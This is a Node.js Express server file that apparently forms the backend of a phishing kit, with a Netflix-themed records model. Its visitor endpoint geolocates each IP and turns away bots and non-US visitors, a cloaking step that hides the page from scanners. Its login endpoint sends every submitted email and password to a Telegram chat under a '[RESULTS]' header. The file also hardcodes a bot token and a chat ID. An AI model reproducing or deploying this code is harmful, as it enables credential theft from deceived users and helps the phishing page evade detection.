const express = require('express');
const fs = require('fs');
const isbot = require('isbot');
const port = 4000;
const { Crawler, middleware } = require('es6-crawler-detect');
const axios = require('axios');
const cors = require("cors")
var bodyParser = require('body-parser');
const Records = require('./Modals/records')
const Netflix = require('./Modals/netflix-records')
const { Telegraf, session, } = require('telegraf');
const bot = new Telegraf('5643284803:AAHNLTS1g3mFA06ypVq37efhJsfSrazpsRs');
// Store for the records
const visitorRecords = {};


const URL = `http://ip-api.com/json/`


var app = express();
app.use(express.json({limit: '50mb'}));
app.use(express.urlencoded({limit: '50mb', extended: true, parameterLimit: 5000}))
app.use(cors());



app.use(function (req, res, next) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', true);
    next();
    });


const sendAPIRequest = async (ipAddress) => {
    const apiResponse = await axios.get(URL + ipAddress);
    return apiResponse.data;
}


app.post('/api/visitor', async (request, response) => {
    try {
      const ipAddress = request.body.ip;
      const userAgent = request.body.userAgent; // Get the user-agent from the request body
      const isCrawler = isbot(userAgent); // Check if the user-agent is a crawler
      const visitor_id = request.body.fingerprint; // Assuming the frontend sends fingerprint as visitorId
  
      const ipAddressInformation = await sendAPIRequest(ipAddress);
  
      var dataBlock = {
          visitor_id: visitor_id,
          ip: ipAddressInformation.query,
          country: ipAddressInformation.country,
          state: ipAddressInformation.regionName,
          isp: ipAddressInformation.isp,
      };


  
  
      if (ipAddressInformation.country === 'United States' && !isCrawler && !visitorRecords[visitor_id]) {
        
    
          // Insert(visitor_id, dataBlock);
           // If not, add the visitor ID to the records and allow access
            visitorRecords[visitor_id] = true;
          bot.telegram.sendMessage(-4066338293, 'New Visitor From IP: ' + ipAddress + '\n' + 'Visitor ID: ' + dataBlock.visitor_id + '\n' + "State: " + dataBlock.state + '\n' + 'Country: ' + dataBlock.country + '\n' + 'ISP: ' + dataBlock.isp);
          response.json({status: 200, session: dataBlock.visitor_id});
      } else {
            console.log('blocked')
          bot.telegram.sendMessage(-4066338293, 'New Visitor From IP: ' + ipAddress + ' - Bot Blocked!');
          response.json({status: 403})// Send 403 status in the response
      }
    } catch (error) {
      console.error('An error occurred:', error);
      response.status(500).send('An internal server error occurred');
    }
  });


app.post('/api/login', function async (request, response){

    console.log(request.body);

    bot.telegram.sendMessage(-4066338293,'------------------[RESULTS]------------------' + '\n'+ 'Visitor ID: '+ request.body.visitor + '\n' + 'ip: ' + request.body.ip + '\n' + 'email: ' + request.body.email + '\n' + 'password: ' + request.body.password)

    response.status(200).send('good')

})







app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`);
});


bot.launch();


// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
